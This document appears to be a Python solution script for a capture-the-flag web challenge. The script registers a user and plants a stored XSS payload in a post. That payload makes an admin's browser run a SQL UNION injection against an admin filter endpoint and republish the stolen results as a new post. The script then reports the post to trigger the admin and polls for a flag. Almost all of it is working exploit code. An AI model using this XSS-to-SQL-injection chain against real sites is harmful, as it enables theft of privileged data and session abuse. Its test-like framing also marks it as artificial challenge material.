import time
import requests
import sys
import re
import random
import urllib.parse
ipsocket = "172.24.3.2:8080"
#ipsocket = sys.argv[1]
url = f"http://{ipsocket}"


s = requests.Session()
## register user
username = "4" + str(random.randint(10, 99) )
password = "4" + str(random.randint(10, 99))
data = {
    "username": username,
    "password": password
}
resp = s.post(f"{url}/register", data=data)

## login to user
resp = s.post(f"{url}/login", data=data)

## create post
sql = "1=1 UNION SELECT *,'j','j' FROM flaflaggs"

encoded_sql = urllib.parse.quote(sql) 

js_payload = f"""
fetch('/admin?filter={encoded_sql}', {{credentials:'include'}})
.then(r => r.text())
.then(html => {{
      const formData = new FormData();
      formData.append('content', html);
      fetch('/post/create', {{
        method: 'POST',
        credentials: 'include',
        body: formData
      }});
}})
"""

post_content = f'<img src=x onerror="{js_payload}">'
resp = s.post(f"{url}/post/create", data={"content": post_content})

resp = s.post(f"{url}/post/4/report")

hidden_flag = None
while not hidden_flag:
    time.sleep(5)
    resp = s.get(f"{url}/")
    hidden_flag = re.search(r"pitfalls\{[^}]+\}", resp.text)
print(hidden_flag.group())
